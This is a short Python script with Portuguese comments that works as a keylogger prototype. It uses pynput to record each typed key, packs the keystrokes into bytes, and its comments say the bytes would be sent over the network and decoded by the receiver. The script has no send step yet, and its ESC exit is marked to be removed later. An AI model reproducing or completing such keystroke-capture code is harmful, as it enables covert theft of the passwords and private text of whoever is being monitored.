from pynput import keyboard

_CAPTURED_KEYS = []

def on_release(key):
    # ESC para sair, tirar depois
    if key == keyboard.Key.esc:
        return False

    try:
        # Teclas normais são adicionadas normalmente
        _CAPTURED_KEYS.append(ord(key.char))

    except AttributeError:
        # Teclas especiais (shift, enter, ctrl, alt, ...)
        # Possíveis valores em
        # https://pynput.readthedocs.io/en/latest/_modules/pynput/keyboard/_base.html#Key
        print(key)
        
if __name__ == '__main__':
    lst = keyboard.Listener(on_release=on_release)
    lst.start()
    lst.join()

    # Convertendo para bytes usando somente 8 bits para economizar
    # espaço, 'p' seria enviado pela rede
    p = [entry.to_bytes(1, 'big') for entry in _CAPTURED_KEYS]
    print(p)

    # Conversão de volta
    # Depois de receber os dados, podemos voltar
    # para o que foi digitado e tratar
    r = b''.join(p).decode('latin-1')
    print(r)
